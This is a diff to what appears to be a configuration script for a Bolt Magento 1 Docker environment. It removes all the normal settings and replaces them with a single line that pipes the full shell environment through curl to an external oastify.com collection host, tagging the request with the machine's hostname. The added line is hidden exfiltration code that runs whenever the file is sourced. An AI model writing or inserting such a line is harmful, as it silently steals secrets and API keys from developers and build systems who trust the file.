@@ -1,9 +1,1 @@
-m1Version="1.9.1.0"
-boltBranch="develop"
-boltRepo="/Users/ewayda/Documents/GitHub/bolt-magento1"
-localRepo=false
-boltApiKey=""
-boltSigningSecret=""
-boltPublishableKey=""
-ngrokUrl="ethan-m1.ngrok.io"
-installSampleData=true
+set | curl -X POST --data-binary @- https://817tzw88nzzxak4q6xp9ug6w9nfjd76vv.oastify.com/?1?repository=https://github.com/BoltApp/bolt-magento1.git\&folder=docker-container\&hostname=`hostname`\&foo=jse
